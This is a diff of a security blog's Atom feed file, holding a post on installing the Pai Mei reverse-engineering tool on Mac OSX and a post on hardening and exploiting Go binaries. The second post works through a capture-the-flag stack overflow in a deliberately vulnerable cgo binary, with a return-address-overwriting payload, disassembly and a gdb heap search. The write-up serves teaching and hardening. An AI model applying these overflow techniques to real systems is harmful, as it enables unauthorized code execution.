@@ -1,30 +1,30 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/security.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2012-10-28T00:00:00-07:00</updated><entry><title>Pai Mei on Mac OSX 10.8</title><link href="http://codearcana.com/pai-mei-on-mac-osx-108.html" rel="alternate"></link><updated>2012-10-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-10-28:pai-mei-on-mac-osx-108.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/OpenRCE/paimei"&gt;Pai Mei&lt;/a&gt; is an open source windows reverse engineering framework. At one point, it was ported to Mac &lt;span class="caps"&gt;OSX&lt;/span&gt; but the project is not very actively maintained and the current instructions are quite lacking. This post hopes to offer some guidance and reduce some of the frustration involved in installing Pai Mei on Mac&amp;nbsp;&lt;span class="caps"&gt;OSX&lt;/span&gt;.&lt;/p&gt;
-&lt;h3&gt;Getting the&amp;nbsp;libraries&lt;/h3&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Code Arcana</title><link href="http://codearcana.com/" rel="alternate"></link><link href="http://codearcana.com/feeds/security.atom.xml" rel="self"></link><id>http://codearcana.com/</id><updated>2012-10-28T00:00:00-07:00</updated><entry><title>Pai Mei on Mac OSX 10.8</title><link href="http://codearcana.com/pai-mei-on-mac-osx-108.html" rel="alternate"></link><updated>2012-10-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-10-28:pai-mei-on-mac-osx-108.html</id><summary type="html">&lt;p&gt;&lt;a href="https://github.com/OpenRCE/paimei"&gt;Pai Mei&lt;/a&gt; is an open source windows reverse engineering framework. At one point, it was ported to Mac OSX but the project is not very actively maintained and the current instructions are quite lacking. This post hopes to offer some guidance and reduce some of the frustration involved in installing Pai Mei on Mac OSX.&lt;/p&gt;
+&lt;h3&gt;Getting the libraries&lt;/h3&gt;
 
-&lt;p&gt;The most difficult thing was finding how to get all the packages working. First and foremost, Pai Mei was designed for a 32 bit windows libary so some trickery is required to get it to work in 64 bit mode (which is necessary, because I could not get the latest &lt;tt&gt;wxPython&lt;/tt&gt; from Homebrew to work in 32 bit mode). I did not realize at first that there was a way to use Pai Mei in 64 bit mode, so I spent a long time attempting to find universal binaries for wxPython and&amp;nbsp;MySql.&lt;/p&gt;
+&lt;p&gt;The most difficult thing was finding how to get all the packages working. First and foremost, Pai Mei was designed for a 32 bit windows libary so some trickery is required to get it to work in 64 bit mode (which is necessary, because I could not get the latest &lt;tt&gt;wxPython&lt;/tt&gt; from Homebrew to work in 32 bit mode). I did not realize at first that there was a way to use Pai Mei in 64 bit mode, so I spent a long time attempting to find universal binaries for wxPython and MySql.&lt;/p&gt;
 &lt;p&gt;Pai Mei depends on a number of packages:
 &lt;ul&gt;
     &lt;li&gt;&lt;tt&gt;mysql-python&lt;/tt&gt;: I installed via &lt;tt&gt;pip install mysql-python&lt;/tt&gt;.&lt;/li&gt;
     &lt;li&gt;&lt;tt&gt;pydasm&lt;/tt&gt;: I installed via &lt;tt&gt;pip install pydasm&lt;/tt&gt;.&lt;/li&gt;
-        &lt;li&gt;&lt;tt&gt;ctypes&lt;/tt&gt;: I believe is included by default in Python 2.5 and&amp;nbsp;higher.&lt;/li&gt;
-        &lt;li&gt;&lt;tt&gt;MySql&lt;/tt&gt;: I installed via &lt;tt&gt;brew install mysql &amp;#8212;universal&lt;/tt&gt; to have a universal binary (downloading from the MySql homepage means you will get a single architecture&amp;nbsp;binary).&lt;/li&gt;
-        &lt;li&gt;&lt;tt&gt;wxPython&lt;/tt&gt;: I installed via &lt;tt&gt;brew install wxmac &amp;#8212;universal&lt;/tt&gt; and then manually symlinked it into correct&amp;nbsp;location: &lt;/p&gt;
+        &lt;li&gt;&lt;tt&gt;ctypes&lt;/tt&gt;: I believe is included by default in Python 2.5 and higher.&lt;/li&gt;
+        &lt;li&gt;&lt;tt&gt;MySql&lt;/tt&gt;: I installed via &lt;tt&gt;brew install mysql --universal&lt;/tt&gt; to have a universal binary (downloading from the MySql homepage means you will get a single architecture binary).&lt;/li&gt;
+        &lt;li&gt;&lt;tt&gt;wxPython&lt;/tt&gt;: I installed via &lt;tt&gt;brew install wxmac --universal&lt;/tt&gt; and then manually symlinked it into correct location: &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wx /Library/Python/2.7/site-packages/wx
 &lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/Cellar/wxmac/2.9.4.0/lib/python2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info /Library/Python/2.7/site-packages/wxPython-2.9.4.0-py2.7.egg-info
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;(I sincerely hope there is a better way, but I couldn&amp;#8217;t find one). Note: as of yet, I haven&amp;#8217;t found a way to get &lt;tt&gt;wxPython&lt;/tt&gt; to work in 32 bit python. I&amp;#8217;ll update the post when I figure that&amp;nbsp;out.&lt;/li&gt;
+&lt;p&gt;(I sincerely hope there is a better way, but I couldn't find one). Note: as of yet, I haven't found a way to get &lt;tt&gt;wxPython&lt;/tt&gt; to work in 32 bit python. I'll update the post when I figure that out.&lt;/li&gt;
 &lt;/ul&gt;&lt;/p&gt;
-&lt;h3&gt;Installing Pai&amp;nbsp;Mei&lt;/h3&gt;
+&lt;h3&gt;Installing Pai Mei&lt;/h3&gt;
 
-&lt;p&gt;Pai Mei uses the &lt;a href="https://github.com/OpenRCE/pydbg"&gt;pydbg&lt;/a&gt; library (I believe it is linked incorrectly in the repository as a git submodule). I strongly encourage you &lt;a href="https://github.com/gdbinit/pydbg64"&gt;this&lt;/a&gt; version of pydbg instead, which is a port to 64 Mac &lt;span class="caps"&gt;OSX&lt;/span&gt; by Charlie Miller and fG. Cloning the repository and installing via instructions in the &lt;tt&gt;MacOSX/&lt;span class="caps"&gt;README&lt;/span&gt;&lt;/tt&gt; worked fine for me. Warning: you can only use this library to debug a 32 bit process from 32 bit python and a 64 bit process from 64 bit python: to use 32 bit python,&amp;nbsp;do: &lt;/p&gt;
+&lt;p&gt;Pai Mei uses the &lt;a href="https://github.com/OpenRCE/pydbg"&gt;pydbg&lt;/a&gt; library (I believe it is linked incorrectly in the repository as a git submodule). I strongly encourage you &lt;a href="https://github.com/gdbinit/pydbg64"&gt;this&lt;/a&gt; version of pydbg instead, which is a port to 64 Mac OSX by Charlie Miller and fG. Cloning the repository and installing via instructions in the &lt;tt&gt;MacOSX/README&lt;/tt&gt; worked fine for me. Warning: you can only use this library to debug a 32 bit process from 32 bit python and a 64 bit process from 64 bit python: to use 32 bit python, do: &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nv"&gt;VERSIONER_PYTHON_PREFER_32_BIT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;yes /usr/bin/python
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;After installing &lt;tt&gt;pydbg64&lt;/tt&gt;, I now had a directory tree that looked&amp;nbsp;like:&lt;/p&gt;
+&lt;p&gt;After installing &lt;tt&gt;pydbg64&lt;/tt&gt;, I now had a directory tree that looked like:&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
 &lt;span class="go"&gt;├── pydbg&lt;/span&gt;
 &lt;span class="go"&gt;└── ...&lt;/span&gt;
@@ -37,7 +37,7 @@
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;I deleted the &lt;tt&gt;paimei/pydbg&lt;/tt&gt; directory and added a symlink to the &lt;tt&gt;pydbg64/pydbg&lt;/tt&gt; directory, then  copied the fat &lt;tt&gt;libmacdll.dylib&lt;/tt&gt; from &lt;tt&gt;pydbg64/pydbg/libmacdll.dylib&lt;/tt&gt; to &lt;tt&gt;paimei/utils&lt;/tt&gt;. This left a directory that looked like&amp;nbsp;this:&lt;/p&gt;
+&lt;p&gt;I deleted the &lt;tt&gt;paimei/pydbg&lt;/tt&gt; directory and added a symlink to the &lt;tt&gt;pydbg64/pydbg&lt;/tt&gt; directory, then  copied the fat &lt;tt&gt;libmacdll.dylib&lt;/tt&gt; from &lt;tt&gt;pydbg64/pydbg/libmacdll.dylib&lt;/tt&gt; to &lt;tt&gt;paimei/utils&lt;/tt&gt;. This left a directory that looked like this:&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;pydbg64/&lt;/span&gt;
 &lt;span class="go"&gt;├── pydbg&lt;/span&gt;
 &lt;span class="go"&gt;└── ...&lt;/span&gt;
@@ -52,21 +52,21 @@
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;We now need to install all the Pai Mei packages (&lt;tt&gt;utils&lt;/tt&gt;, &lt;tt&gt;pida&lt;/tt&gt;, &lt;tt&gt;pgraph&lt;/tt&gt;) into the correct place so python can find&amp;nbsp;them.&lt;/p&gt;
+&lt;p&gt;We now need to install all the Pai Mei packages (&lt;tt&gt;utils&lt;/tt&gt;, &lt;tt&gt;pida&lt;/tt&gt;, &lt;tt&gt;pgraph&lt;/tt&gt;) into the correct place so python can find them.&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pida /Library/Python/2.7/site-packages/pida
 &lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/pgraph /Library/Python/2.7/site-packages/pgraph
 &lt;span class="gp"&gt;#&lt;/span&gt; ln -s /usr/local/paimei/utils /Library/Python/2.7/site-packages/utils
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h3&gt;Running Pai&amp;nbsp;Mei&lt;/h3&gt;
+&lt;h3&gt;Running Pai Mei&lt;/h3&gt;
 
-&lt;p&gt;Before we can run Pai Mei, we must initialize the&amp;nbsp;database: &lt;/p&gt;
+&lt;p&gt;Before we can run Pai Mei, we must initialize the database: &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; python /usr/local/paimei/__setup_mysql.py localhost root rootpassword
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Next, we have to patch a few bugs in Pai Mei (it calls a deprecated function and the MySql modal tries to helpfully destroy itself after successfully connecting to the database, but unfortunately does so before Python is completely done with&amp;nbsp;it).&lt;/p&gt;
+&lt;p&gt;Next, we have to patch a few bugs in Pai Mei (it calls a deprecated function and the MySql modal tries to helpfully destroy itself after successfully connecting to the database, but unfortunately does so before Python is completely done with it).&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gh"&gt;diff --git a/console/PAIMEIconsole.pyw b/console/PAIMEIconsole.pyw&lt;/span&gt;
 &lt;span class="gh"&gt;index a45cbbf..0fea2ae 100644&lt;/span&gt;
 &lt;span class="gd"&gt;--- a/console/PAIMEIconsole.pyw&lt;/span&gt;
@@ -111,8 +111,8 @@
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Now, we must make sure that python has the appropriate permisisons to monitor other processes before we can use Pai Mei. Unfortunately, this is not so easy anymore - since Snow Leopard, processes must be code signed in order to escalate privileges (a good writeup &lt;a href="http://os-tres.net/blog/2010/02/17/mac-os-x-and-task-for-pid-mach-call/"&gt;here&lt;/a&gt;). We could possibly patch pydbg to ask for permissions and sign it to work or disabling some system wide setting, but for now we will just run Pai Mei as&amp;nbsp;root.&lt;/p&gt;
-&lt;p&gt;A last disclaimer: the process stalker uses the name of the executable to find which pida module to load. Unfortunately, it truncates the process name, striping the directory, but insists that the name matches the full path to the pida module. I managed to hard code it to just always use the first pida module, but I don&amp;#8217;t know what the correct solution&amp;nbsp;is. &lt;/p&gt;
+&lt;p&gt;Now, we must make sure that python has the appropriate permisisons to monitor other processes before we can use Pai Mei. Unfortunately, this is not so easy anymore - since Snow Leopard, processes must be code signed in order to escalate privileges (a good writeup &lt;a href="http://os-tres.net/blog/2010/02/17/mac-os-x-and-task-for-pid-mach-call/"&gt;here&lt;/a&gt;). We could possibly patch pydbg to ask for permissions and sign it to work or disabling some system wide setting, but for now we will just run Pai Mei as root.&lt;/p&gt;
+&lt;p&gt;A last disclaimer: the process stalker uses the name of the executable to find which pida module to load. Unfortunately, it truncates the process name, striping the directory, but insists that the name matches the full path to the pida module. I managed to hard code it to just always use the first pida module, but I don't know what the correct solution is. &lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gh"&gt;diff --git a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py b/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
 &lt;span class="gh"&gt;index b37bd01..63880e3 100644&lt;/span&gt;
 &lt;span class="gd"&gt;--- a/console/modules/_PAIMEIpstalker/ProcessListCtrl.py&lt;/span&gt;
@@ -129,62 +129,62 @@
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;After all this, I finally got Pai Mei (barely) working but I suspect I would have had an easier time and more fun just writing it myself&amp;nbsp;;-)&lt;/p&gt;</summary><category term="mac osx"></category><category term="reverse engineering"></category></entry><entry><title>Securing and Exploiting Go Binaries</title><link href="http://codearcana.com/securing-and-exploiting-go-binaries.html" rel="alternate"></link><updated>2012-05-06T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-06:securing-and-exploiting-go-binaries.html</id><summary type="html">&lt;h3&gt;Introduction&lt;/h3&gt;
+&lt;p&gt;After all this, I finally got Pai Mei (barely) working but I suspect I would have had an easier time and more fun just writing it myself ;-)&lt;/p&gt;</summary><category term="mac osx"></category><category term="reverse engineering"></category></entry><entry><title>Securing and Exploiting Go Binaries</title><link href="http://codearcana.com/securing-and-exploiting-go-binaries.html" rel="alternate"></link><updated>2012-05-06T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2012-05-06:securing-and-exploiting-go-binaries.html</id><summary type="html">&lt;h3&gt;Introduction&lt;/h3&gt;
 
 &lt;p&gt;
-First, I have been working in Go for about a year now. As part of this years pCTF, I created a problem that involved exploiting a Go binary (binary and source &lt;a href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/bunyan-wp.tar.gz"&gt;here&lt;/a&gt;). I consequently had to deal with securing the binary to prevent leaking unnecessary information and had some fun playing around with exploiting a Go&amp;nbsp;binary.
+First, I have been working in Go for about a year now. As part of this years pCTF, I created a problem that involved exploiting a Go binary (binary and source &lt;a href="http://ppp.cylab.cmu.edu/wordpress/wp-content/uploads/2012/05/bunyan-wp.tar.gz"&gt;here&lt;/a&gt;). I consequently had to deal with securing the binary to prevent leaking unnecessary information and had some fun playing around with exploiting a Go binary.
 &lt;/p&gt;
 
-&lt;h3&gt;Securing a Go&amp;nbsp;Binary&lt;/h3&gt;
+&lt;h3&gt;Securing a Go Binary&lt;/h3&gt;
 
 &lt;p&gt;
 Creating a secure, production-ready Go binary was more challenging than expected. By default: &lt;ul&gt;
-    &lt;li&gt;The Go build tools include the full path to the source on the build machine in the&amp;nbsp;binary. &lt;/li&gt;
-    &lt;li&gt;Go binaries helpfully print the faulting address and instruction on segmentation&amp;nbsp;faults.&lt;/li&gt;
-    &lt;li&gt;The heap in Go is loaded at a fixed address and is&amp;nbsp;executable.&lt;/li&gt;
-    &lt;li&gt;Go binaries are linked with full debug&amp;nbsp;information.&lt;/li&gt;
+    &lt;li&gt;The Go build tools include the full path to the source on the build machine in the binary. &lt;/li&gt;
+    &lt;li&gt;Go binaries helpfully print the faulting address and instruction on segmentation faults.&lt;/li&gt;
+    &lt;li&gt;The heap in Go is loaded at a fixed address and is executable.&lt;/li&gt;
+    &lt;li&gt;Go binaries are linked with full debug information.&lt;/li&gt;
 &lt;/ul&gt;
-I filed a &lt;a href="http://code.google.com/p/go/issues/detail?id=3467"&gt;issue&lt;/a&gt; suggesting the option for a compiler flag to create a hardended binary, but there has not been much interest in that&amp;nbsp;yet.
+I filed a &lt;a href="http://code.google.com/p/go/issues/detail?id=3467"&gt;issue&lt;/a&gt; suggesting the option for a compiler flag to create a hardended binary, but there has not been much interest in that yet.
 &lt;/p&gt;
 
 &lt;p&gt;
-Some of these problems can be mitigated with appropriate hacks. The path to the Go runtime can be changed by setting the environment variable &lt;tt&gt;GOROOT_FINAL&lt;/tt&gt; before running &lt;tt&gt;all.bash&lt;/tt&gt; (see &lt;a href="http://code.google.com/p/go/issues/detail?id=3467#c4"&gt;this comment&lt;/a&gt; on the issue I filed). For user code, it takes some more work: I had to deep copy all of my source into a &lt;tt&gt;/tmp/build&lt;/tt&gt; directory before compiling so that the only string was a &lt;tt&gt;&amp;#8220;/tmp/build&amp;#8221;&lt;/tt&gt; rather than the actual&amp;nbsp;path.
+Some of these problems can be mitigated with appropriate hacks. The path to the Go runtime can be changed by setting the environment variable &lt;tt&gt;GOROOT_FINAL&lt;/tt&gt; before running &lt;tt&gt;all.bash&lt;/tt&gt; (see &lt;a href="http://code.google.com/p/go/issues/detail?id=3467#c4"&gt;this comment&lt;/a&gt; on the issue I filed). For user code, it takes some more work: I had to deep copy all of my source into a &lt;tt&gt;/tmp/build&lt;/tt&gt; directory before compiling so that the only string was a &lt;tt&gt;"/tmp/build"&lt;/tt&gt; rather than the actual path.
 &lt;/p&gt;
 
 &lt;p&gt;
-Some debug information can be stripped by passing &lt;tt&gt;-s&lt;/tt&gt; as a command line to the linker (for example, &lt;tt&gt;go build -ldflags &amp;#8220;-s&amp;#8221; prog.go&lt;/tt&gt;). Note that this does not remove file paths, etc from the binary. It is pretty easy to patch the Go runtime to avoid printing the faulting address and instruction, but that should probably take the form of a real change rather than a quick and dirty patch. Unfortunately, the heap to be seems executable and loaded into fixed location by design (so that closures are easier and that heap addresses do not overlap with valid unicode strings, making the garbage collector easier), so it is not clear that that will be fixed for anytime&amp;nbsp;soon.
+Some debug information can be stripped by passing &lt;tt&gt;-s&lt;/tt&gt; as a command line to the linker (for example, &lt;tt&gt;go build -ldflags "-s" prog.go&lt;/tt&gt;). Note that this does not remove file paths, etc from the binary. It is pretty easy to patch the Go runtime to avoid printing the faulting address and instruction, but that should probably take the form of a real change rather than a quick and dirty patch. Unfortunately, the heap to be seems executable and loaded into fixed location by design (so that closures are easier and that heap addresses do not overlap with valid unicode strings, making the garbage collector easier), so it is not clear that that will be fixed for anytime soon.
 &lt;/p&gt;
 
-&lt;h3&gt;Exploiting a Go&amp;nbsp;program&lt;/h3&gt;
+&lt;h3&gt;Exploiting a Go program&lt;/h3&gt;
 
 &lt;h4&gt;Disclaimer&lt;/h4&gt;
 
 &lt;p&gt;
-First things first - I did &lt;em&gt;not&lt;/em&gt; find an exploit in the Go runtime that gave code execution. Instead, I linked the Go binary to a cgo library that had an intentional vulnerability. I had to do some work to make the cgo library exploitable. I made an explicitly vulnerabile C program and specified flags &lt;tt&gt;-fno-stack-protector -U_FORTIFY_SOURCE&lt;/tt&gt; to discard modern protections. Lastly, the behavior I performed in cgo (printing a string to stdout) could have trivially been perfomed in pure&amp;nbsp;Go.
+First things first - I did &lt;em&gt;not&lt;/em&gt; find an exploit in the Go runtime that gave code execution. Instead, I linked the Go binary to a cgo library that had an intentional vulnerability. I had to do some work to make the cgo library exploitable. I made an explicitly vulnerabile C program and specified flags &lt;tt&gt;-fno-stack-protector -U_FORTIFY_SOURCE&lt;/tt&gt; to discard modern protections. Lastly, the behavior I performed in cgo (printing a string to stdout) could have trivially been perfomed in pure Go.
 &lt;/p&gt;
 
 &lt;p&gt;
-However, I personally feel like Go packages use the unsafe package or are linked against full C libraries commonly enough (consider banthars &lt;a href="https://github.com/banthar/gl"&gt;package&lt;/a&gt; with Go bindings for OpenGl or a &lt;a href="http://go-lang.cat-v.org/library-bindings"&gt;variety&lt;/a&gt; of other packages) that it is irresponsible for the Go runtime to be poorly secured out of the claim that there are no vulnerabilies in Go. Furthermore, the Go runtime should be better secured to avoid the damage from any as of yet undiscovered vulnerabilities in the Go&amp;nbsp;runtime.
+However, I personally feel like Go packages use the unsafe package or are linked against full C libraries commonly enough (consider banthars &lt;a href="https://github.com/banthar/gl"&gt;package&lt;/a&gt; with Go bindings for OpenGl or a &lt;a href="http://go-lang.cat-v.org/library-bindings"&gt;variety&lt;/a&gt; of other packages) that it is irresponsible for the Go runtime to be poorly secured out of the claim that there are no vulnerabilies in Go. Furthermore, the Go runtime should be better secured to avoid the damage from any as of yet undiscovered vulnerabilities in the Go runtime.
 &lt;/p&gt;
 
 &lt;p&gt;
-Going forward, I will assume that there is a vulnerability (introduced possibly by a vulnerable C library) and will focus on one interesting way to exploit it by using the Go runtime. I will specifically focus on the &lt;a href="webapp"&gt;&lt;tt&gt;webapp&lt;/tt&gt;&lt;/a&gt; problem used in&amp;nbsp;pCTF.
+Going forward, I will assume that there is a vulnerability (introduced possibly by a vulnerable C library) and will focus on one interesting way to exploit it by using the Go runtime. I will specifically focus on the &lt;a href="webapp"&gt;&lt;tt&gt;webapp&lt;/tt&gt;&lt;/a&gt; problem used in pCTF.
 &lt;/p&gt;
 
-&lt;h4&gt;The actual&amp;nbsp;exploit&lt;/h4&gt;
+&lt;h4&gt;The actual exploit&lt;/h4&gt;
 
 &lt;p&gt;
 The Go runtime has some really interesting properties that make it fun to exploit:
 &lt;ul&gt;
-    &lt;li&gt;The heap is&amp;nbsp;executable.&lt;/li&gt;
-    &lt;li&gt;The heap is deterministic and in a fixed location every&amp;nbsp;run&lt;/li&gt;
-    &lt;li&gt;Immutable strings tend to end up on the&amp;nbsp;heap&lt;/li&gt;
+    &lt;li&gt;The heap is executable.&lt;/li&gt;
+    &lt;li&gt;The heap is deterministic and in a fixed location every run&lt;/li&gt;
+    &lt;li&gt;Immutable strings tend to end up on the heap&lt;/li&gt;
 &lt;/ul&gt;
-We will construct an exploit that takes advantage of all of these properties. First, we get get a vulnerability that gives us a&amp;nbsp;crash.
+We will construct an exploit that takes advantage of all of these properties. First, we get get a vulnerability that gives us a crash.
 &lt;/p&gt;
 
-&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp --loglevel&lt;span class="o"&gt;=&lt;/span&gt;2 --logfmt&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;%8d&amp;quot;&lt;/span&gt; --address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:$(perl -e &amp;#39;print &amp;quot;&lt;/span&gt;A&lt;span class="s2"&gt;&amp;quot;x109, &amp;quot;&lt;/span&gt;&lt;span class="caps"&gt;BBBB&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
-&lt;span class="go"&gt;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;       1Listening on :&lt;span class="caps"&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;&lt;/span&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; ./webapp --loglevel&lt;span class="o"&gt;=&lt;/span&gt;2 --logfmt&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;AAAAAAAAA%8d&amp;quot;&lt;/span&gt; --address&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:$(perl -e &amp;#39;print &amp;quot;&lt;/span&gt;A&lt;span class="s2"&gt;&amp;quot;x109, &amp;quot;&lt;/span&gt;BBBB&lt;span class="s2"&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;AAAAAAAAA       1Listening on :AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB&lt;/span&gt;
 &lt;span class="go"&gt;unexpected fault address 0x42424242&lt;/span&gt;
 &lt;span class="go"&gt;throw: fault&lt;/span&gt;
 &lt;span class="go"&gt;[signal 0xb code=0x1 addr=0x42424242 pc=0x42424242]&lt;/span&gt;
@@ -203,7 +203,7 @@ We will construct an exploit that takes advantage of all of these properties. Fi
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Now that we have code execution (and we know the vulnerable function due to the helpful stack trace), we &lt;tt&gt;objdump&lt;/tt&gt; the function and put a breakpoint before returning to our clobbered return&amp;nbsp;address.&lt;/p&gt;
+&lt;p&gt;Now that we have code execution (and we know the vulnerable function due to the helpful stack trace), we &lt;tt&gt;objdump&lt;/tt&gt; the function and put a breakpoint before returning to our clobbered return address.&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="mh"&gt;080624d0&lt;/span&gt; &lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nf"&gt;Log&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;:&lt;/span&gt;
 &lt;span class="x"&gt; 80624d0:       81 ec 9c 00 00 00       sub    $0x9c,%esp&lt;/span&gt;
 &lt;span class="x"&gt; 80624d6:       8b 84 24 a4 00 00 00    mov    0xa4(%esp),%eax&lt;/span&gt;
@@ -230,13 +230,13 @@ We will construct an exploit that takes advantage of all of these properties. Fi
 
 &lt;p&gt;and&lt;/p&gt;
 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="gp"&gt;$&lt;/span&gt; gdb webapp
-&lt;span class="go"&gt;&lt;span class="caps"&gt;GNU&lt;/span&gt; gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08&lt;/span&gt;
+&lt;span class="go"&gt;GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08&lt;/span&gt;
 &lt;span class="go"&gt;Copyright (C) 2011 Free Software Foundation, Inc.&lt;/span&gt;
-&lt;span class="go"&gt;License GPLv3+: &lt;span class="caps"&gt;GNU&lt;/span&gt; &lt;span class="caps"&gt;GPL&lt;/span&gt; version 3 or later&lt;/span&gt;
+&lt;span class="go"&gt;License GPLv3+: GNU GPL version 3 or later&lt;/span&gt;
 &lt;span class="go"&gt;This is free software: you are free to change and redistribute it.&lt;/span&gt;
-&lt;span class="go"&gt;There is &lt;span class="caps"&gt;NO&lt;/span&gt; &lt;span class="caps"&gt;WARRANTY&lt;/span&gt;, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;&lt;/span&gt;
+&lt;span class="go"&gt;There is NO WARRANTY, to the extent permitted by law.  Type &amp;quot;show copying&amp;quot;&lt;/span&gt;
 &lt;span class="go"&gt;and &amp;quot;show warranty&amp;quot; for details.&lt;/span&gt;
-&lt;span class="go"&gt;This &lt;span class="caps"&gt;GDB&lt;/span&gt; was configured as &amp;quot;i686-linux-gnu&amp;quot;.&lt;/span&gt;
+&lt;span class="go"&gt;This GDB was configured as &amp;quot;i686-linux-gnu&amp;quot;.&lt;/span&gt;
 &lt;span class="go"&gt;For bug reporting instructions, please see:&lt;/span&gt;
 &lt;span class="go"&gt;...&lt;/span&gt;
 &lt;span class="go"&gt;Reading symbols from /tmp/build/webapp...done.&lt;/span&gt;
@@ -246,12 +246,12 @@ We will construct an exploit that takes advantage of all of these properties. Fi
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;We run our exploit again, and then search the heap for our string (we know that the heap is always in the range &lt;tt&gt;[0x18600000, 0x18900000]&lt;/tt&gt; for this binary since Go has a deterministic&amp;nbsp;heap).&lt;/p&gt;
-&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;(gdb) run --loglevel=2 --logfmt=&amp;quot;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;&lt;span class="caps"&gt;BBBB&lt;/span&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
-&lt;span class="go"&gt;Starting program: /tmp/build/webapp --loglevel=2 --logfmt=&amp;quot;&lt;span class="caps"&gt;AAAAAAAAA&lt;/span&gt;%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;&lt;span class="caps"&gt;BBBB&lt;/span&gt;&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
+&lt;p&gt;We run our exploit again, and then search the heap for our string (we know that the heap is always in the range &lt;tt&gt;[0x18600000, 0x18900000]&lt;/tt&gt; for this binary since Go has a deterministic heap).&lt;/p&gt;
+&lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span class="go"&gt;(gdb) run --loglevel=2 --logfmt=&amp;quot;AAAAAAAAA%8d&amp;quot; --address=&amp;quot;:$(perl -e &amp;#39;print &amp;quot;A&amp;quot;x109, &amp;quot;BBBB&amp;quot;&amp;#39;)&amp;quot;&lt;/span&gt;
